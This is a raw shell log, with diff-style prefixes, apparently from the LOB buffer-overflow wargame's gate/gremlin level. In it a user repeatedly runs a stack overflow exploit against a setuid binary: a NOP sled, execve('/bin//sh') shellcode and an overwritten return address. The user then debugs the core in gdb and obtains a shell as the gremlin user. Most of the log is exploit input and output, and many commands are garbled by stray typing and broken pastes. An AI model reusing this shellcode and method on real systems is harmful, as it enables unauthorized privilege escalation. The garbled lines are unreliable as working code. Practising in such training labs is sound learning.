+[gate@localhost gate]$ ./gremlim `python -c 'print"\x90"*214+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\3\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`
+101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                      ̀10̀f
+Segmentation fault (core dumped)
+[gate@localhost gate]$ ./gremlim `python -c 'print"\x90"*214+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\3\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`
+101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                      ̀10̀f
+Segmentation fault (core dumped)
+[gate@localhost gate]$ ./gremlim `python -c 'print"\x90"*214+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\3\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`
+101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                      ̀10̀f
+Segmentation fault (core dumped)
+[gagagatatatatagagatatatatatatatatatatatatate@localhost gate]$ ./gremlim `python -c 'print"\xdsafasdfsa90"*235+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`
+safasdfsaCx90101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                                   ̀10̀f
+Segmentation fault (core dumped)
+[gate@loc@localhost gate]$ ./gremlim `python -cint"\x90dsafasdfsaCx90"*235+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`
+safasdfsaCx90101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                                   ̀10̀f
+Segmentation fault (core dumped)
+[gagagagagagagagagagagagatagatate@localhost gate]$ ./gremlim `python -c 'print"\x90"*235+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x5d\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`
+x90
+[gagate@localhost gate]$ ./gremlim `python -c 'print"\x0"*235+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x5x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`
+\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90\xx90101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                                                   ̀10̀f
+Segmentation fault (core dumped)
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gagate@localhost gate]$ ./gremlim `python -c 'print"\0"*235+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x5389\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`
+101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                      ̀10̀f
+Segmentation fault (core dumped)
+[gate@localhost gate]$ ./gremlim `python -c 'print"\x90"*235+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\3\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`
+101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                      ̀10̀f
+Segmentation fault (core dumped)
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ 
+[gate@localhost gate]$ asdf
+bash2: asdf: command not found
+[gate@localhost gate]$ sdf
+bash2: sdf: command not found
+[gate@localhost gate]$ fsda
+bash2: fsda: command not found
+[gate@localhost gate]$ sadf
+bash2: sadf: command not found
+[gate@localhost gate]$ sdf
+bash2: sdf: command not found
+[gagatate@localhost gate]$ ./gremlim `python -c 'print"\x9*235+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"\x68\xfb\xff\bf"'`
+101̀É￱0F̀1￐h//shh/bin⏓ኂ°
+                      ̀10̀f
+Segmentation fault (core dumped)
+[gate@localhost gate]$ ls
+core  gremlim  gremlin  gremlin.c
+[gate@localhost gate]$ ls 
+core  gremlim  gremlin  gremlin.c
+[gate@localhost gate]$ ./gremlim `python -c 'print"\x90"*235+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\[gate@localhost gate]$ ./gremlim `python -c 'print"\x90"*235+"\x31\xc0\xb0\x31\xcd\x80\x89                                                                                                     > ;
+> '
+> 1
+> `
+  File "<string>", line 1
+    print"\x90"*235+"\x31\xc0\xb0\x31\xcd\x80\x89
+                                                ^
+SyntaxError: invalid token
+bash2: 1: command not found
+argv error
+[gate@localhost gate]$ ./gremlim `python -c 'print"\x90"*235+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
+1￐h//shh/bin⏓ኂ°
+               ̀ 
+Segmentation fault (core dumped)
+[gate@localhost gate]$ ./gremlim `python -c 'print"\x90"*235+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
+1￐h//shh/bin⏓ኂ°
+               ̀ 
+Segmentation fault (core dumped)
+[gate@localhost gate]$ gdb -c core
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux".
+Core was generated by `./gremlim '.
+Program terminated with signal 11, Segmentation fault.
+#0  0x40030902 in ?? ()
+(gdb) x/50 $esp
+0xbffffa20:	0x00000002	0xbffffa64	0xbffffa70	0x40013868
+0xbffffa30:	0x00000002	0x08048380	0x00000000	0x080483a1
+0xbffffa40:	0x08048430	0x00000002	0xbffffa64	0x080482e0
+0xbffffa50:	0x080484bc	0x4000ae60	0xbffffa5c	0x40013e90
+0xbffffa60:	0x00000002	0xbffffb58	0xbffffb67	0x00000000
+0xbffffa70:	0xbffffc6c	0xbffffc7b	0xbffffc93	0xbffffcb2
+0xbffffa80:	0xbffffcd4	0xbffffcde	0xbffffea1	0xbffffec0
+0xbffffa90:	0xbffffeda	0xbffffeef	0xbfffff0b	0xbfffff16
+0xbffffaa0:	0xbfffff2f	0xbfffff3c	0xbfffff44	0xbfffff4e
+0xbffffab0:	0xbfffff5e	0xbfffff6c	0xbfffff7a	0xbfffff8b
+0xbffffac0:	0xbfffff96	0xbfffffa6	0xbfffffe6	0x00000000
+0xbffffad0:	0x00000003	0x08048034	0x00000004	0x00000020
+0xbffffae0:	0x00000005	0x00000006
+(gdb) 
+0xbffffae8:	0x00000006	0x00001000	0x00000007	0x40000000
+0xbffffaf8:	0x00000008	0x00000000	0x00000009	0x08048380
+0xbffffb08:	0x0000000b	0x000001f4	0x0000000c	0x000001f4
+0xbffffb18:	0x0000000d	0x000001f4	0x0000000e	0x000001f4
+0xbffffb28:	0x00000010	0x0fabfbff	0x0000000f	0xbffffb58
+0xbffffb38:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffb48:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffb58:	0x36383669	0x672f2e00	0x6c6d6572	0x90006d69
+0xbffffb68:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb78:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb88:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffb98:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffba8:	0x90909090	0x90909090
+(gdb) 
+0xbffffbb0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbc0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbd0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbe0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbf0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc00:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc10:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc20:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc30:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc40:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc50:	0xc0319090	0x2f2f6850	0x2f686873	0x896e6962
+0xbffffc60:	0x895350e3	0xb0c289e1	0x0080cd0b	0x3d445750
+0xbffffc70:	0x6d6f682f	0x61672f65
+(gdb) r
+Starting program:  
+No executable file specified.
+Use the "file" or "exec-file" command.
+(gdb) exit
+Undefined command: "exit".  Try "help".
+(gdb) q
+[gate@localhost gate]$ ./gremlim `python -c 'print"\x90"*235+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x68\xfb\xff\xbf"'`
+1￐h//shh/bin⏓ኂ°
+               ̀h
+bash$ exit
+exit
+[gate@localhost gate]$ ./gremlin `python -c 'print"\x90"*235+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x68\xfb\xff\xbf"'`
+1￐h//shh/bin⏓ኂ°
+               ̀h
+bash$ id
+uid=500(gate) gid=500(gate) euid=501(gremlin) egid=501(gremlin) groups=500(gate)
+bash$ mypass
+sh: mypass: command not found
+bash$ my-pass
+euid = 501
+hello bof world
+bash$   
+bash$ ~~
+sh: ~~: command not found
+bash$ ls
+ls: .: Permission denied
+bash$ exit
+exit
+[gate@localhost gate]$ ls
+core  gremlim  gremlin  gremlin.c
+[gate@localhost gate]$ vi shellD
+[gate@localhost gate]$ ls
+core  gremlim  gremlin  gremlin.c  shellD
+[gate@localhost gate]$ cat shellD
+쉘땄다~
+[gate@localhost gate]$ exit
+exit
+[gate@localhost gate]$ exit
+logout
+
+Connection closed by foreign host.
+
+Disconnected from remote host(LOB) at 17:07:47.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ 
+[c:\~]$ 
